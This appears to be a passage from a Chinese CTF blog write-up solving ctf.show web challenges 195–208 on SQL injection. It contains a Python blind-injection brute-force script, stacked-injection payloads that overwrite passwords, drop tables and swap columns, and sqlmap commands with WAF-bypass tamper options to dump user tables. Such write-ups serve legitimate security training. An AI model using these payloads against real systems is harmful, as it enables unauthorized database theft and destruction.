<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">payload = "'or ((lpad((<span class="hljs-keyword">select</span> f1ag <span class="hljs-keyword">from</span> ctfshow_flxg),{},<span class="hljs-string">''</span>)=<span class="hljs-string">'{}'</span>))#<span class="hljs-string">".format(i,flag + key)</span><br></code></pre></td></tr></tbody></table></figure>

<p>脚本：</p>
<figure class="highlight sas"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sas">import requests<br>import time<br><br>url = <span class="hljs-string">"http://23f26665-5c68-47cb-869f-7f954ea5e77f.challenge.ctf.show/api"</span><br><br>flagstr = <span class="hljs-string">"}{abcdefghijklmnopqr-stuvwxyz0123456789"</span><br>flag = <span class="hljs-string">""</span><br>for i <span class="hljs-keyword">in</span> <span class="hljs-meta">range</span>(1, 60):<br>    for <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> flagstr:<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select database()),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # ctfshow_web<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # ctfshow_fl0g<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # id,f1ag<br>        payload = <span class="hljs-string">"'or ((lpad((select f1ag from ctfshow_flxg),{},'')='{}'))#"</span>.<span class="hljs-keyword">format</span>(i, flag + <span class="hljs-keyword">key</span>)<br><span class="hljs-keyword"></span><br><span class="hljs-keyword">        data </span>= {<br>            <span class="hljs-string">"username"</span>: payload,<br>            <span class="hljs-string">"password"</span>: 0<br>        }<br>        res = requests.post(url, data=data)<br>        time.sleep(0.3)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">"8bef"</span>) &gt; 0:<br>            flag += <span class="hljs-keyword">key</span><br>            pr<span class="hljs-meta">int</span>(flag)<br>            break<br><br><br></code></pre></td></tr></tbody></table></figure>

<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="WEB195"><a href="#WEB195" class="headerlink" title="WEB195"></a>WEB195</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//拼接sql语句查找指定ID用户</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select pass from ctfshow_user where username = <span class="hljs-subst">{$username}</span>;"</span>;<br><br><span class="hljs-comment">//密码检测</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>)){<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'密码只能为数字'</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>}<br><br><span class="hljs-comment">//密码判断</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">'pass'</span>]==<span class="hljs-variable">$password</span>){<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'登陆成功'</span>;<br>  }<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span>, <span class="hljs-variable">$username</span>)){<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'用户名非法'</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]==<span class="hljs-variable">$password</span>){<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">"登陆成功 flag is <span class="hljs-subst">$flag</span>"</span>;<br>}<br>  <br></code></pre></td></tr></tbody></table></figure>

<p>通过查询语句可知表ctfshow_user和字段名pass,虽然过滤了空格，但是可以使用反引号。</p>
<figure class="highlight abnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">username</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">;update`ctfshow_user`set`pass`=1&amp;password=1</span><br>//这里username<span class="hljs-operator">=</span><span class="hljs-number">1</span>；写成username<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-comment">;也可以的，不影响后面update的执行，两条语句都会执行。</span><br></code></pre></td></tr></tbody></table></figure>

<p>登录：</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">然后<span class="hljs-attribute">username</span>=0&amp;password=1登陆。<br>（<span class="hljs-attribute">username</span>=0这个做法在web188中有提到，就是匹配所有开头不是数字或者为0的字符串和数字0）<br></code></pre></td></tr></tbody></table></figure>

<h3 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h3><figure class="highlight gherkin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧<br>  if(preg_match('/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\'</span>|<span class="hljs-string">\"</span>|<span class="hljs-string">se1ect</span>|<span class="hljs-string">union</span>|<span class="hljs-string">or</span>|<span class="hljs-string">and</span>|<span class="hljs-string">\x26</span>|<span class="hljs-string">\x7c</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into/i', $username)){</span><br><span class="hljs-string">    $ret['msg']='用户名非法';</span><br><span class="hljs-string">    die(json_encode($ret));</span><br><span class="hljs-string">  }</span><br><span class="hljs-string"></span><br><span class="hljs-string">  if(strlen($username)&gt;16){</span><br><span class="hljs-string">    $ret['msg']='用户名不能超过16个字符';</span><br><span class="hljs-string">    die(json_encode($ret));</span><br><span class="hljs-string">  }</span><br><span class="hljs-string"></span><br><span class="hljs-string">  if($row[0]==$password){</span><br><span class="hljs-string">      $ret['msg']="登陆成功 flag is $flag";</span><br><span class="hljs-string">  }</span><br></code></pre></td></tr></tbody></table></figure>

<p>和上一题相比，限定了用户名的长度，上面本拟过滤se1ect,其中是1，不是l</p>
<figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select 0x11111;select 2;</span><br><span class="hljs-section">+---------+</span><br><span class="hljs-section">| 0x11111 |</span><br><span class="hljs-section">+---------+</span><br><span class="hljs-section">|      |</span><br><span class="hljs-section">+---------+</span><br>1 row in set (0.00 sec)<br><br><span class="hljs-code">+---+</span><br><span class="hljs-section">| 2 |</span><br><span class="hljs-section">+---+</span><br><span class="hljs-section">| 2 |</span><br><span class="hljs-section">+---+</span><br>1 row in set (0.00 sec)<br><br>mysql&gt;<br></code></pre></td></tr></tbody></table></figure>

<p>可以看到，两个select语句查询结果不论第一个结果是如何的，根据PHP验证密码的代码逻辑，都会保存到数组<code>$row</code>中，这里代码虽然只判断了<code>$row</code>[0}，但应该循环遍历了，才会使<code>$row[?] = 2</code>成立。</p>
<p>PY:</p>
<figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=<span class="hljs-number">1</span><span class="hljs-comment">;select(2)&amp;password=2</span><br><span class="hljs-attr">username</span>=<span class="hljs-number">0</span>&amp;password=passwordAUTO<br></code></pre></td></tr></tbody></table></figure>

<p>后面的payload是根据前面题目泄露的密码来实现登录的。</p>
<h3 id="WEB197"><a href="#WEB197" class="headerlink" title="WEB197"></a>WEB197</h3><figure class="highlight gherkin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧<br>if('/\<span class="hljs-symbol">*</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\'</span>|<span class="hljs-string">\"</span>|<span class="hljs-string">union</span>|<span class="hljs-string">or</span>|<span class="hljs-string">and</span>|<span class="hljs-string">\x26</span>|<span class="hljs-string">\x7c</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select</span>|<span class="hljs-string">update</span>|<span class="hljs-string">set//i', $username)){</span><br><span class="hljs-string">  $ret['msg']='用户名非法';</span><br><span class="hljs-string">  die(json_encode($ret));</span><br><span class="hljs-string">}</span><br><span class="hljs-string"></span><br><span class="hljs-string">if($row[0]==$password){</span><br><span class="hljs-string">    $ret['msg']="登陆成功 flag is $flag";</span><br><span class="hljs-string">}</span><br></code></pre></td></tr></tbody></table></figure>

<p>可以看到，这次没有过滤<strong>空格</strong>。</p>
<p>PY1:</p>
<figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=<span class="hljs-number">0</span>&amp;password=passwordAUTO<br></code></pre></td></tr></tbody></table></figure>

<p>PY2:</p>
<p>删除以前的表，再自己新建一个并且插入数据：u1,p2,然后直接使用u1，p2登录即可得到flag</p>
<figure class="highlight less"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-number">0</span>;<span class="hljs-selector-tag">drop</span> <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">ctfshow_user</span>;<span class="hljs-selector-tag">create</span> <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">ctfshow_user</span>(<span class="hljs-built_in">`username`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">100</span>),<span class="hljs-built_in">`pass`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">100</span>));<span class="hljs-selector-tag">insert</span> <span class="hljs-selector-tag">ctfshow_user</span>(<span class="hljs-built_in">`username`</span>,<span class="hljs-built_in">`pass`</span>) <span class="hljs-selector-tag">value</span>(u1,p2)<br></code></pre></td></tr></tbody></table></figure>

<p>PY3:</p>
<p>这个思路我真的觉得想出来的人真是厉害。</p>
<p>利用show。根据题目给的查询语句,通过查询语句可以知道数据库的表名为ctfshow_user，那么可以通过show tables，获取表名的结果集，在这个结果集里定然有一行的数据为ctfshow_user。</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=1;show tables&amp;<span class="hljs-attribute">password</span>=ctfshow_user<br><span class="hljs-attribute">username</span>=1;desc ctfshow_user&amp;<span class="hljs-attribute">password</span>=pass<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB198"><a href="#WEB198" class="headerlink" title="WEB198"></a>WEB198</h3><p>增加了过滤SQL关键词drop和create</p>
<figure class="highlight gherkin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧<br>if('/\<span class="hljs-symbol">*</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\'</span>|<span class="hljs-string">\"</span>|<span class="hljs-string">union</span>|<span class="hljs-string">or</span>|<span class="hljs-string">and</span>|<span class="hljs-string">\x26</span>|<span class="hljs-string">\x7c</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select</span>|<span class="hljs-string">update</span>|<span class="hljs-string">set</span>|<span class="hljs-string">create</span>|<span class="hljs-string">drop/i', $username)){</span><br><span class="hljs-string">  $ret['msg']='用户名非法';</span><br><span class="hljs-string">  die(json_encode($ret));</span><br><span class="hljs-string">}</span><br></code></pre></td></tr></tbody></table></figure>

<p>在已知有一个默认用户名为userAUTO的情况下，这里可以考虑列名互换。<br>将username和pass互换，这样就可以用userAUTO进行密码登录了。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `username` `passw` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `pass` `username` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `passw` `pass` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB199"><a href="#WEB199" class="headerlink" title="WEB199"></a>WEB199</h3><p>过滤了括号，可以使用text</p>
<figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">本题过滤了括号，限制了之前payload中的<span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>)，可以改为<span class="hljs-type">text</span>。<br><br><span class="hljs-number">0</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `username` `passw` <span class="hljs-type">text</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `pass` `username` <span class="hljs-type">text</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `passw` `pass` <span class="hljs-type">text</span>;<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB200"><a href="#WEB200" class="headerlink" title="WEB200"></a>WEB200</h3><p>增加了对逗号的过滤，web199方法可用。</p>
<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><h3 id="WEB201"><a href="#WEB201" class="headerlink" title="WEB201"></a>WEB201</h3><p>题目说明了需要指定两个参数：</p>
<figure class="highlight ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">使用<span class="hljs-comment">--user-agent 指定agent</span><br>使用<span class="hljs-comment">--referer 绕过referer检查</span><br></code></pre></td></tr></tbody></table></figure>

<ol>
<li><code>--user-agent</code> 参数用于设置 HTTP 请求的用户代理（User-Agent）头部字段。用户代理是一个字符串，用于标识发送请求的客户端应用程序或浏览器。通过指定自定义的用户代理，可以模拟不同的客户端环境或绕过某些限制。</li>
<li><code>--referer</code> 参数用于设置 HTTP 请求的引荐来源（Referer）头部字段。引荐来源指示请求是从哪个页面或网址链接过来的。通过设置引荐来源，可以模拟从特定页面发起的请求。</li>
</ol>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap.py -u <span class="hljs-string">"http://ad34430e-5963-46f0-b4bc-aabce11aead4.challenge.ctf.show/api/?id="</span> <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show<br></code></pre></td></tr></tbody></table></figure>

<p>查库：</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show --dbs<br></code></pre></td></tr></tbody></table></figure>

<p>查表：</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web --tables<br></code></pre></td></tr></tbody></table></figure>

<p>查字段：</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web -T ctfshow_user --columns<br></code></pre></td></tr></tbody></table></figure>

<p>查数据：</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web -T ctfshow_user --dump<br><span class="hljs-comment">#--dump 是一个参数选项，用于执行数据库的数据提取操作。它用于从目标应用程序的数据库中获取数据，并将其以结构化的形式输出。</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB202"><a href="#WEB202" class="headerlink" title="WEB202"></a>WEB202</h3><p><code>--data</code> 是一个参数选项，用于指定要发送的 POST 数据。它用于针对目标应用程序的带有参数的 POST 请求进行 SQL 注入测试。</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">"http://cca6a196-4f81-44ec-9d20-556a2aae0834.challenge.ctf.show/api/"</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attr">--user-agent</span>=sqlmap <span class="hljs-attr">--referer</span>=ctf<span class="hljs-selector-class">.show</span> -D ctfshow_web -T ctfshow_user <span class="hljs-attr">--dump</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB203"><a href="#WEB203" class="headerlink" title="WEB203"></a>WEB203</h3><p>使用–method 调整sqlmap的请求方式</p>
<p>–method=方法  强制使用指定的方式进行连接，例如PUT  </p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python sqlmap.py -u <span class="hljs-string">"http://b8366c04-871e-45b6-b332-cb6962888879.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--method</span>=PUT <span class="hljs-attribute">--header</span>=Content-Type:text/plain <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web -T ctfshow_user --dump<br></code></pre></td></tr></tbody></table></figure>

<p>在 SQLmap 工具中，<code>--headers</code> 参数用于指定要发送的 HTTP 请求头部信息。具体而言，<code>--headers</code> 参数可以用来设置请求的 Content-Type（内容类型）头部字段。</p>
<p><code>--headers</code> 参数后的字符串 <code>"Content-Type: text/plain"</code> 设置了请求的 Content-Type 头部字段为 <code>text/plain</code>，表明请求的内容是纯文本类型。</p>
<h3 id="WEB204"><a href="#WEB204" class="headerlink" title="WEB204"></a>WEB204</h3><p>使用–cookie 提交cookie数据</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">"http://e497aba7-725c-487b-b3b9-54f0f677c7d7.challenge.ctf.show/api/index.php"</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">"ctfshow=6daba8a2b1f168ba92da07587b2cd1ff;PHPSESSID=k70fe1sbeheh768f9lhrnmd447"</span> <span class="hljs-attr">--user-agent</span>=sqlmap <span class="hljs-attr">--referer</span>=ctf<span class="hljs-selector-class">.show</span> -D ctfshow_web -T ctfshow_user <span class="hljs-attr">--dump</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB205"><a href="#WEB205" class="headerlink" title="WEB205"></a>WEB205</h3><p>在每次请求url/api/index.php之前需要先请求URL/api/getTokn.php</p>
<figure class="highlight ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--safe-url 设置在测试目标地址前访问的安全链接</span><br> <span class="hljs-comment">--safe-freq 设置两次注入测试前访问安全链接的次数</span><br></code></pre></td></tr></tbody></table></figure>

<p>PY:</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python sqlmap.py -u <span class="hljs-string">"http://bc631087-8535-4c5b-830f-83dcedb8434f.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://bc631087-8535-4c5b-830f-83dcedb8434f.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=e5cp9lcnqfo3e6ru4dt41642l3"</span> <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--method</span>=PUT <span class="hljs-attribute">--header</span>=Content-Type:text/plain <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web --tables<br></code></pre></td></tr></tbody></table></figure>

<p>SQLMAP跑不出来</p>
<h3 id="WEB206"><a href="#WEB206" class="headerlink" title="WEB206"></a>WEB206</h3><p>提示SQL需要闭合：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select id,username,pass from ctfshow_user where id = ('"</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">"') limit 0,1;"</span>;<br></code></pre></td></tr></tbody></table></figure>

<p>–prefix=PREFIX 攻击载荷的前缀</p>
<p>–suffix=SUFFIX 攻击载荷的后缀</p>
<p>PY:</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://e15e183b-345b-474b-b491-164951f03aa5.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://e15e183b-345b-474b-b491-164951f03aa5.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=7pqhussjpqb1fftslnljopu8hl"</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">"')"</span> <span class="hljs-attribute">--suffix</span>=<span class="hljs-string">"#"</span> <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--method</span>=PUT <span class="hljs-attribute">--header</span>=Content-Type:text/plain <span class="hljs-attribute">--referer</span>=ctf.show<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB207"><a href="#WEB207" class="headerlink" title="WEB207"></a>WEB207</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{<br>   <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ /'</span>, <span class="hljs-variable">$str</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure>

<p>过滤了空格</p>
<p>PY:</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://9507b4d3-5ca0-46bc-af7a-a77913b1761b.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://9507b4d3-5ca0-46bc-af7a-a77913b1761b.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=mk5nb09g143c60d5uh4sb9fc1f"</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">"')"</span> <span class="hljs-attribute">--suffix</span>=<span class="hljs-string">"#"</span> <span class="hljs-attribute">--tamper</span>=space2comment <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--method</span>=PUT <span class="hljs-attribute">--header</span>=Content-Type:text/plain <span class="hljs-attribute">--referer</span>=ctf.show<br></code></pre></td></tr></tbody></table></figure>

<p><code>--tamper=space2comment</code> 将 SQL 语句中的空格字符（包括空格、制表符、换行符等）替换为 SQL 注释字符（<code>/**/</code>），以实现将空格字符转换为注释的效果。</p>
<h3 id="WEB208"><a href="#WEB208" class="headerlink" title="WEB208"></a>WEB208</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'select'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$id</span>);<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{<br>   <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ /'</span>, <span class="hljs-variable">$str</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure>

<p>将select替空，可以使用双写绕过，也可以使用大小写绕过</p>
<p>PY:</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://ffa2159b-c185-4525-b3c5-9f39fb76afee.challenge.ctf.show/api/index.php"</span> --dump <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://ffa2159b-c185-4525-b3c5-9f39fb76afee.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=hdffns5n4d5lkbkri059dnkua0"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=space2comment<br></code></pre></td></tr></tbody></table></figure>

